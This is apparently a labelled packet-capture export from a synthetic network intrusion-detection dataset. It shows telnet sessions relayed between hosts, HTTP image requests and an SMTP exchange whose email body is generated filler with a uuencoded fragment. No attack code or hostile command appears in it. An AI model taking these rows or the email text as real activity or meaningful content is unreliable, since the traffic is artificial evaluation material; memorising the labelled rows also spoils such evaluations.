"R"," R", "405848","12:10:53.338280","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=446 Ack=4963 Win=32120 Len=0"
"R"," R", "405849","12:10:53.398379","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405850","12:10:53.398696","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405851","12:10:53.399025","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405852","12:10:53.399346","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405853","12:10:53.416183","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=198 Ack=2762 Win=31744 Len=0"
"R"," R", "405854","12:10:53.418258","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=447 Ack=4964 Win=32120 Len=0"
"R"," R", "405855","12:10:53.468575","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405856","12:10:53.468894","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405857","12:10:53.469217","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405858","12:10:53.469537","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405859","12:10:53.471458","172.16.114.169","155.217.58.58","TCP","60","8236 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "405860","12:10:53.478685","155.217.58.58","172.16.114.169","TCP","60","80 → 8236 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "405861","12:10:53.478904","172.16.114.169","155.217.58.58","TCP","60","8236 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "405862","12:10:53.479406","172.16.114.169","155.217.58.58","HTTP","292","GET /atdl/search/ACRONYM.HTM HTTP/1.0 "
"R"," R", "405863","12:10:53.486169","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=199 Ack=2763 Win=31744 Len=0"
"R"," R", "405864","12:10:53.488263","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=448 Ack=4965 Win=32120 Len=0"
"R"," R", "405865","12:10:53.503815","155.217.58.58","172.16.114.169","TCP","60","80 → 8236 [ACK] Seq=1 Ack=239 Win=32736 Len=0"
"R"," R", "405866","12:10:53.518453","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405867","12:10:53.518773","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405868","12:10:53.519100","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405869","12:10:53.519423","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405870","12:10:53.523624","155.217.58.58","172.16.114.169","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "405871","12:10:53.524857","155.217.58.58","172.16.114.169","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "405872","12:10:53.528180","172.16.114.169","155.217.58.58","TCP","60","8236 → 80 [ACK] Seq=239 Ack=2921 Win=32120 Len=0"
"R"," R", "405873","12:10:53.532548","155.217.58.58","172.16.114.169","TCP","199","[TCP segment of a reassembled PDU]"
"R"," R", "405874","12:10:53.532650","155.217.58.58","172.16.114.169","HTTP","60","HTTP/1.0 200 OK  (text/html)"
"R"," R", "405875","12:10:53.532795","172.16.114.169","155.217.58.58","TCP","60","8236 → 80 [ACK] Seq=239 Ack=3067 Win=32120 Len=0"
"R"," R", "405876","12:10:53.533033","172.16.114.169","155.217.58.58","TCP","60","8236 → 80 [FIN, ACK] Seq=239 Ack=3067 Win=32120 Len=0"
"R"," R", "405877","12:10:53.536157","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=200 Ack=2764 Win=31744 Len=0"
"R"," R", "405878","12:10:53.538084","155.217.58.58","172.16.114.169","TCP","60","80 → 8236 [ACK] Seq=3067 Ack=240 Win=32735 Len=0"
"R"," R", "405879","12:10:53.538287","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=449 Ack=4966 Win=32120 Len=0"
"R"," R", "405880","12:10:53.539154","172.16.114.169","155.217.58.58","TCP","60","8239 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "405881","12:10:53.542768","155.217.58.58","172.16.114.169","TCP","60","80 → 8239 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "405882","12:10:53.542925","172.16.114.169","155.217.58.58","TCP","60","8239 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "405883","12:10:53.543384","172.16.114.169","155.217.58.58","HTTP","285","GET /gif/acronym.gif HTTP/1.0 "
"R"," R", "405884","12:10:53.563000","155.217.58.58","172.16.114.169","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "405885","12:10:53.563743","155.217.58.58","172.16.114.169","HTTP","917","HTTP/1.0 200 OK  (GIF89a)"
"R"," R", "405886","12:10:53.563812","155.217.58.58","172.16.114.169","TCP","60","80 → 8239 [FIN, ACK] Seq=2324 Ack=232 Win=32736 Len=0"
"R"," R", "405887","12:10:53.563971","172.16.114.169","155.217.58.58","TCP","60","8239 → 80 [ACK] Seq=232 Ack=2325 Win=30660 Len=0"
"R"," R", "405888","12:10:53.564418","172.16.114.169","155.217.58.58","TCP","60","8239 → 80 [FIN, ACK] Seq=232 Ack=2325 Win=32120 Len=0"
"R"," R", "405889","12:10:53.565570","172.16.114.169","155.217.58.58","TCP","60","8240 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "405890","12:10:53.568583","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405891","12:10:53.568902","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405892","12:10:53.569231","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405893","12:10:53.569359","155.217.58.58","172.16.114.169","TCP","60","80 → 8239 [ACK] Seq=2325 Ack=233 Win=32735 Len=0"
"R"," R", "405894","12:10:53.569554","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405895","12:10:53.571792","155.217.58.58","172.16.114.169","TCP","60","80 → 8240 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "405896","12:10:53.571974","172.16.114.169","155.217.58.58","TCP","60","8240 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "405897","12:10:53.586146","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=201 Ack=2765 Win=31744 Len=0"
"R"," R", "405898","12:10:53.588231","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=450 Ack=4967 Win=32120 Len=0"
"R"," R", "405899","12:10:53.601371","172.16.114.169","155.217.58.58","HTTP","286","GET /gif/paper-05.gif HTTP/1.0 "
"R"," R", "405900","12:10:53.623790","155.217.58.58","172.16.114.169","TCP","60","80 → 8240 [ACK] Seq=1 Ack=233 Win=32736 Len=0"
"R"," R", "405901","12:10:53.634658","155.217.58.58","172.16.114.169","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "405902","12:10:53.635904","155.217.58.58","172.16.114.169","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "405903","12:10:53.638142","172.16.114.169","155.217.58.58","TCP","60","8240 → 80 [ACK] Seq=233 Ack=2921 Win=32120 Len=0"
"R"," R", "405904","12:10:53.644669","155.217.58.58","172.16.114.169","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "405905","12:10:53.645964","155.217.58.58","172.16.114.169","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "405906","12:10:53.647195","155.217.58.58","172.16.114.169","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "405907","12:10:53.648128","172.16.114.169","155.217.58.58","TCP","60","8240 → 80 [ACK] Seq=233 Ack=7301 Win=32120 Len=0"
"R"," R", "405908","12:10:53.654517","155.217.58.58","172.16.114.169","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "405909","12:10:53.655110","155.217.58.58","172.16.114.169","HTTP","702","HTTP/1.0 200 OK  (GIF89a)"
"R"," R", "405910","12:10:53.655168","155.217.58.58","172.16.114.169","TCP","60","80 → 8240 [FIN, ACK] Seq=9409 Ack=233 Win=32736 Len=0"
"R"," R", "405911","12:10:53.655306","172.16.114.169","155.217.58.58","TCP","60","8240 → 80 [ACK] Seq=233 Ack=9410 Win=30660 Len=0"
"R"," R", "405912","12:10:53.685075","172.16.114.169","155.217.58.58","TCP","60","8240 → 80 [FIN, ACK] Seq=233 Ack=9410 Win=32120 Len=0"
"R"," R", "405913","12:10:53.689148","155.217.58.58","172.16.114.169","TCP","60","80 → 8240 [ACK] Seq=9410 Ack=234 Win=32735 Len=0"
"R"," R", "405914","12:10:53.742038","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405915","12:10:53.742359","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405916","12:10:53.742688","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405917","12:10:53.743009","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405918","12:10:53.756113","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=202 Ack=2766 Win=31744 Len=0"
"R"," R", "405919","12:10:53.758224","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=451 Ack=4968 Win=32120 Len=0"
"R"," R", "405920","12:10:53.788707","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405921","12:10:53.789029","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405922","12:10:53.789350","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405923","12:10:53.789670","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405924","12:10:53.806111","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=203 Ack=2767 Win=31744 Len=0"
"R"," R", "405925","12:10:53.808194","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=452 Ack=4969 Win=32120 Len=0"
"R"," R", "405926","12:10:53.838370","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405927","12:10:53.838689","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405928","12:10:53.839023","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405929","12:10:53.839345","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405930","12:10:53.856098","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=204 Ack=2768 Win=31744 Len=0"
"R"," R", "405931","12:10:53.858172","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=453 Ack=4970 Win=32120 Len=0"
"R"," R", "405932","12:10:53.888503","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405933","12:10:53.888823","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405934","12:10:53.889148","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405935","12:10:53.889470","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405936","12:10:53.906087","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=205 Ack=2769 Win=31744 Len=0"
"R"," R", "405937","12:10:53.908209","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=454 Ack=4971 Win=32120 Len=0"
"R"," R", "405938","12:10:53.938489","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405939","12:10:53.938810","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405940","12:10:53.939138","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405941","12:10:53.939459","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405942","12:10:53.956073","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=206 Ack=2770 Win=31744 Len=0"
"R"," R", "405943","12:10:53.958154","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=455 Ack=4972 Win=32120 Len=0"
"R"," R", "405944","12:10:53.988264","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405945","12:10:53.988587","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405946","12:10:53.988906","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405947","12:10:53.989228","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405948","12:10:54.006067","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=207 Ack=2771 Win=31744 Len=0"
"R"," R", "405949","12:10:54.008141","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=456 Ack=4973 Win=32120 Len=0"
"R"," R", "405950","12:10:54.098238","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405951","12:10:54.098558","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405952","12:10:54.098887","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405953","12:10:54.099208","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405954","12:10:54.116045","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=208 Ack=2772 Win=31744 Len=0"
"R"," R", "405955","12:10:54.118125","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=457 Ack=4974 Win=32120 Len=0"
"R"," R", "405956","12:10:54.148502","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405957","12:10:54.148834","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405958","12:10:54.149184","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405959","12:10:54.149506","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405960","12:10:54.166034","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=209 Ack=2773 Win=31744 Len=0"
"R"," R", "405961","12:10:54.168113","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=458 Ack=4975 Win=32120 Len=0"
"R"," R", "405962","12:10:54.208241","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405963","12:10:54.208565","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405964","12:10:54.208889","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405965","12:10:54.209210","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405966","12:10:54.226019","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=210 Ack=2774 Win=31744 Len=0"
"R"," R", "405967","12:10:54.228129","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=459 Ack=4976 Win=32120 Len=0"
"R"," R", "405968","12:10:54.258344","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405969","12:10:54.258684","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405970","12:10:54.259005","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405971","12:10:54.259328","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405972","12:10:54.267855","172.16.115.234","172.16.112.100","NBNS","110","Refresh NB PC0<03>"
"R"," R", "405973","12:10:54.276015","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=211 Ack=2775 Win=31744 Len=0"
"R"," R", "405974","12:10:54.278117","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=460 Ack=4977 Win=32120 Len=0"
"R"," R", "405975","12:10:54.328437","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405976","12:10:54.328754","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405977","12:10:54.329084","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405978","12:10:54.329406","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405979","12:10:54.346000","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=212 Ack=2776 Win=31744 Len=0"
"R"," R", "405980","12:10:54.348088","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=461 Ack=4978 Win=32120 Len=0"
"R"," R", "405981","12:10:54.398272","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405982","12:10:54.398594","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405983","12:10:54.398919","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405984","12:10:54.399239","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405985","12:10:54.416008","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=213 Ack=2777 Win=31744 Len=0"
"R"," R", "405986","12:10:54.418060","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=462 Ack=4979 Win=32120 Len=0"
"R"," R", "405987","12:10:54.488158","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405988","12:10:54.488480","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405989","12:10:54.488814","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405990","12:10:54.489136","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405991","12:10:54.505962","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=214 Ack=2778 Win=31744 Len=0"
"R"," R", "405992","12:10:54.508041","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=463 Ack=4980 Win=32120 Len=0"
"R"," R", "405993","12:10:54.588338","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405994","12:10:54.588638","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "405995","12:10:54.588968","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "405996","12:10:54.589288","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "405997","12:10:54.605941","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=215 Ack=2779 Win=31744 Len=0"
"R"," R", "405998","12:10:54.608025","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=464 Ack=4981 Win=32120 Len=0"
"R"," R", "405999","12:10:54.634637","172.16.112.207","196.227.33.189","SMTP","140","S: 220 robin.eyrie.af.mil Sendmail 4.1/SMI-4.1 ready at Wed, 31 Mar 1999 12:11:00 -0500"
"R"," R", "406000","12:10:54.637918","196.227.33.189","172.16.112.207","SMTP","76","C: EHLO saturn.kiwi.org"
"R"," R", "406001","12:10:54.638288","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406002","12:10:54.638428","172.16.112.207","196.227.33.189","SMTP","80","S: 500 Command unrecognized"
"R"," R", "406003","12:10:54.638614","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406004","12:10:54.638938","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406005","12:10:54.639258","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406006","12:10:54.639353","196.227.33.189","172.16.112.207","SMTP","76","C: HELO saturn.kiwi.org"
"R"," R", "406007","12:10:54.639612","172.16.112.207","196.227.33.189","SMTP","98","S: 250 (saturn.kiwi.org) pleased to meet you."
"R"," R", "406008","12:10:54.640673","196.227.33.189","172.16.112.207","SMTP","92","C: MAIL From:<cameronm@saturn.kiwi.org>"
"R"," R", "406009","12:10:54.640920","172.16.112.207","196.227.33.189","SMTP","99","S: 250 <cameronm@saturn.kiwi.org>... Sender Ok"
"R"," R", "406010","12:10:54.641849","196.227.33.189","172.16.112.207","SMTP","90","C: RCPT To:<josee@robin.eyrie.af.mil>"
"R"," R", "406011","12:10:54.642080","172.16.112.207","196.227.33.189","SMTP","89","S: 250 <josee@robin.eyrie.af.mil> OK"
"R"," R", "406012","12:10:54.642945","196.227.33.189","172.16.112.207","SMTP","92","C: RCPT To:<taegang@robin.eyrie.af.mil>"
"R"," R", "406013","12:10:54.643185","172.16.112.207","196.227.33.189","SMTP","91","S: 250 <taegang@robin.eyrie.af.mil> OK"
"R"," R", "406014","12:10:54.644016","196.227.33.189","172.16.112.207","SMTP","60","C: DATA"
"R"," R", "406015","12:10:54.645860","172.16.112.207","196.227.33.189","SMTP","104","S: 354 Enter mail, end with ." on a line by itself""
"R"," R", "406016","12:10:54.648374","196.227.33.189","172.16.112.207","SMTP","1078","C: DATA fragment, 1024 bytes"
"R"," R", "406017","12:10:54.655930","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=216 Ack=2780 Win=31744 Len=0"
"R"," R", "406018","12:10:54.658007","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=465 Ack=4982 Win=32120 Len=0"
"R"," R", "406019","12:10:54.667951","172.16.112.207","196.227.33.189","TCP","60","25 → 19560 [ACK] Seq=324 Ack=1187 Win=32736 Len=0"
"R"," R", "406020","12:10:54.669858","196.227.33.189","172.16.112.207","IMF","734","subject: VendorShell dialog is given by id, ,             VendorShell dialog is given by id Apr Edt open the  ,             translation table pcm speech.   ,   ,             Syllable primary function product will have The clan as  ,             quiet: Room, San Francisco de Paris, Les of text stores on  ,             that can arrange when it has an ordinary differential  ,             equations.  Could you My present: more suggestions please  ,             wait see go around right now hundreds of Tex by Moving our  ,             bills, should be take very happen, to understand and of July  ,             would be by w.   , Here is some uuencoded stuff  ,   , begin 644 foo895  , M( @($%L<V\@:6UP;W)T86YT('1O('1E8VAN:7%U92P@9F]R(&]T:&5R(&]R  "
"R"," R", "406021","12:10:54.672985","172.16.112.207","196.227.33.189","SMTP","73","S: 250 Mail accepted"
"R"," R", "406022","12:10:54.673865","196.227.33.189","172.16.112.207","SMTP","60","C: QUIT"
"R"," R", "406023","12:10:54.674098","172.16.112.207","196.227.33.189","SMTP","78","S: 221 Closing connection"
"R"," R", "406024","12:10:54.675023","172.16.112.207","196.227.33.189","TCP","60","25 → 19560 [FIN, ACK] Seq=367 Ack=1873 Win=32736 Len=0"
"R"," R", "406025","12:10:54.675738","196.227.33.189","172.16.112.207","TCP","60","19560 → 25 [ACK] Seq=1873 Ack=368 Win=32120 Len=0"
"R"," R", "406026","12:10:54.680632","196.227.33.189","172.16.112.207","TCP","60","19560 → 25 [FIN, ACK] Seq=1873 Ack=368 Win=32120 Len=0"
"R"," R", "406027","12:10:54.680797","172.16.112.207","196.227.33.189","TCP","60","25 → 19560 [ACK] Seq=368 Ack=1874 Win=32735 Len=0"
"R"," R", "406028","12:10:54.681018","196.227.33.189","172.16.114.148","TCP","60","19563 → 25 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "406029","12:10:54.681313","172.16.114.148","196.227.33.189","TCP","60","25 → 19563 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "406030","12:10:54.682161","196.227.33.189","172.16.114.148","TCP","60","19563 → 25 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "406031","12:10:54.748358","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406032","12:10:54.748675","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406033","12:10:54.748999","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406034","12:10:54.749321","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406035","12:10:54.765906","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=217 Ack=2781 Win=31744 Len=0"
"R"," R", "406036","12:10:54.767989","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=466 Ack=4983 Win=32120 Len=0"
"R"," R", "406037","12:10:54.798288","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406038","12:10:54.798609","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406039","12:10:54.798947","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406040","12:10:54.799269","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406041","12:10:54.815904","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=218 Ack=2782 Win=31744 Len=0"
"R"," R", "406042","12:10:54.817989","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=467 Ack=4984 Win=32120 Len=0"
"R"," R", "406043","12:10:54.848094","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406044","12:10:54.848414","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406045","12:10:54.848739","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406046","12:10:54.849062","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406047","12:10:54.865888","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=219 Ack=2783 Win=31744 Len=0"
"R"," R", "406048","12:10:54.867977","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=468 Ack=4985 Win=32120 Len=0"
"R"," R", "406049","12:10:54.898290","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406050","12:10:54.898611","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406051","12:10:54.898944","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406052","12:10:54.899273","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406053","12:10:54.915882","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=220 Ack=2784 Win=31744 Len=0"
"R"," R", "406054","12:10:54.917975","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=469 Ack=4986 Win=32120 Len=0"
"R"," R", "406055","12:10:55.008058","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406056","12:10:55.008381","172.16.114.50","172.16.112.50","TELNET","60","Telnet Data ..."
"R"," R", "406057","12:10:55.008709","172.16.112.50","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "406058","12:10:55.009031","172.16.114.50","195.115.218.108","TELNET","60","Telnet Data ..."
"R"," R", "406059","12:10:55.025858","172.16.114.50","172.16.112.50","TCP","60","2478 → 23 [ACK] Seq=221 Ack=2785 Win=31744 Len=0"
"R"," R", "406060","12:10:55.027952","195.115.218.108","172.16.114.50","TCP","60","18481 → 23 [ACK] Seq=470 Ack=4987 Win=32120 Len=0"
"R"," R", "406061","12:10:55.118125","195.115.218.108","172.16.114.50","TELNET","60","Telnet Data ..."
